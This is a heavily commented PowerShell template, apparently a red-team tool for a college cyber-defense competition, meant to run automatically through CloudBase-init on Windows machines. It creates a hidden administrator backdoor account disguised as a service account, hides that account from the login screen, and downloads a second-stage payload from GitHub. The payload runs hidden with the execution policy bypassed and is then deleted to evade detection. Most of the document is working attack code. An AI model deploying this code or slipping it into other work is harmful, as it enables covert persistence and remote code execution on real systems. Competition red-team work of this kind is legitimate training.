# bootstrap.ps1.j2

# This file is a Jinja2 template that lives in the templates/ folder of the
# Ansible repo on the Kali machine. Ansible processes it with the win_template
# module which injects any {{ variables }} from vault.yml before copying it
# to the target machine. It is dropped into CloudBase-init's LocalScripts
# directory as 02_bootstrap.ps1 and executed automatically every time
# CloudBase-init runs. It is the first stage payload responsible for
# establishing persistence and pulling the second stage from GitHub.

# ── 1. Create hidden administrator account ───────────────────────────────────
# Gets the machine hostname and converts it to lowercase. The hostname is used
# as part of the password generation so each machine gets a unique password
# derived from the same seed phrase. This means we never store passwords
# anywhere — we can always recalculate them from the seed and hostname.
$hostname = $env:COMPUTERNAME.ToLower()

# The backdoor username is set to cloudbase-init1 to blend in with the
# legitimate cloudbase-init0 service account that already exists on every
# OpenStack Windows instance. Blue team would need to know the exact account
# count to identify this as illegitimate.
$username = "cloudbase-init1"

# ── Password derivation ───────────────────────────────────────────────────────
# Instead of hardcoding a password we derive it deterministically using SHA256.
# The seed phrase is concatenated with the hostname and hashed. The first 16
# characters of the base64 encoded hash are used as the password with a
# suffix of !A1 appended to satisfy Windows complexity requirements.
# Anyone on the red team who knows the seed phrase can recalculate the password
# for any machine using calc_password.py without storing credentials anywhere.
$seed     = "redteam-rit-2026"
$bytes    = [System.Text.Encoding]::UTF8.GetBytes($seed + $hostname)
$hash     = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
$password = ([Convert]::ToBase64String($hash)).Substring(0,16) + "!A1"

# Converts the plaintext password string into a SecureString object which is
# required by New-LocalUser. The -AsPlainText -Force flags tell PowerShell
# we intentionally want to convert plaintext to SecureString.
$securePass = ConvertTo-SecureString $password -AsPlainText -Force

# Only creates the user if it does not already exist. This makes the script
# safe to run multiple times without throwing errors. -PasswordNeverExpires
# ensures the account stays usable indefinitely without requiring a password
# change. -ErrorAction Stop causes the script to halt if user creation fails
# rather than continuing with a broken state.
if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name $username -Password $securePass -PasswordNeverExpires -ErrorAction Stop
    Add-LocalGroupMember -Group "Administrators" -Member $username
}

# ── Hide user from Windows login screen ──────────────────────────────────────
# Windows reads this registry key to determine which accounts to hide from
# the login screen. Setting a username here with a value of 0 hides it from
# the graphical login UI. A user sitting at the machine would not see
# cloudbase-init1 listed as an available account. The account still exists
# and can be used for remote login or RunAs.
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
Set-ItemProperty -Path $regPath -Name $username -Value 0 -Type DWord

# ── 2. Pull second stage payload from GitHub ─────────────────────────────────
# Constructs the URL to the raw payload.ps1 file in the GitHub repo.
# Using raw.githubusercontent.com serves the file as plain text which
# Invoke-WebRequest can download and execute directly without cloning the repo.
$repoBase   = "https://raw.githubusercontent.com/BSparacio/CDT_Red_Team_Tool/main"
$payloadUrl = "$repoBase/payload.ps1"

# Generates a random GUID as the filename for the downloaded payload.
# This means every execution writes to a different temp filename making
# it harder for blue team to create a file-based detection rule.
$dest       = "C:\Windows\Temp\$(New-Guid).ps1"

try {
    # Downloads payload.ps1 from GitHub to the random temp path.
    # -UseBasicParsing avoids loading the Internet Explorer engine which
    # may not be available on all Windows configurations and is faster.
    Invoke-WebRequest -Uri $payloadUrl -OutFile $dest -UseBasicParsing
    "Downloaded payload successfully" | Out-File "C:\Users\Public\bootstrap_log.txt" -Force

    # Executes the downloaded payload in a hidden window with execution
    # policy bypassed. -WindowStyle Hidden prevents any console window
    # from appearing to the user. -ExecutionPolicy Bypass overrides any
    # system policy that would block unsigned scripts from running.
    powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $dest
    "Executed payload successfully" | Out-File "C:\Users\Public\bootstrap_log.txt" -Append
} catch {
    # Writes any error to a log file for debugging. In a fully operational
    # deployment this should be removed to reduce forensic artifacts.
    "ERROR: $($_.Exception.Message)" | Out-File "C:\Users\Public\bootstrap_log.txt" -Force
} finally {
    # Always deletes the temp payload file whether execution succeeded or
    # failed. This reduces the forensic footprint on the target machine
    # since the payload never persists on disk after running.
    Remove-Item $dest -Force -ErrorAction SilentlyContinue
}

# ── 3. Proof of execution ─────────────────────────────────────────────────────
# Creates a proof.txt file in C:\Users\Public to confirm this script ran
# successfully. Used during testing to verify the CloudBase-init execution
# chain is working. Can be removed before the competition if desired to
# reduce artifacts that blue team could use to detect our presence.
New-Item -Path "C:\Users\Public\proof.txt" -ItemType File -Force